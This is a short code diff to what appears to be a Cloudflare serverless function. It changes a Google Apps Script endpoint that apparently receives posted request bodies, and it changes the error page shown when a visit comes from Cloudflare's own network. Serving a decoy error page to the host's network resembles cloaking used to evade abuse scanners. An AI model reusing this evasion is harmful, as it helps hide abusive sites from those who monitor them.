@@ -1,5 +1,4 @@
-// api/namul.js
-const GAS_URL = "https://script.google.com/macros/s/AKfycbxTuwvFpVFcsFjShTwaJ-77WeMbO2cWNZmrCX2ko6b1iHuzWsEBJa6Zpy8OazqIyyiRug/exec";
+const GAS_URL = "https://script.google.com/macros/s/AKfycbyVlxOFm_L5RUeKSkBDZ69FWPX40ITzU1XQ_5GbBMydJEc3MomXYpbZv3BNTbHt1D3T/exec";
 
 export async function onRequestPost({ request }) {
   const body = await request.json();
@@ -15,7 +14,7 @@ export async function onRequestPost({ request }) {
 export async function onRequestGet({ request }) {
   const cf = request.cf || {};
   if (cf.isIntranet || cf.asn === "13335") { 
-    return Response.redirect("/error.html", 302);
+    return Response.redirect("../../IDCerror.html", 302);
   }
   return new Response(await fetch("/index.html").then(r => r.text()), {
     headers: { "Content-Type": "text/html" }
